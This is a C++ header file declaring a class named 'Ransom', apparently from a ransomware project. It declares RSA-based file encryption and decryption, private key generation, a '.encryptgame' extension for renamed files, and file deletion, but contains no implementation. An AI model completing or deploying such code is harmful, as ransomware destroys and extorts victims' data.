#pragma once

#include <rsa.h>
#include <files.h>
#include <osrng.h>
#include <filesystem>
#include <rsa.h>

class Ransom
{
public:
	Ransom() = default;
	~Ransom() = default;
	void run_encryption_logic();
	void run_decryption_logic();

private:
	const char* encryption_file_ = "rsakey.der";
	const char* custom_extension_name = ".encryptgame";
	CryptoPP::AutoSeededRandomPool rng_;
	CryptoPP::RSAES_OAEP_SHA_Decryptor* rsaes_oaep_sha_decryptor_;
	void encrypt_files(const char* file_name);
	void decrypt_files(const char* file_name);
	void generate_rsa_private_key();
	static void delete_file(const char* file);
	
};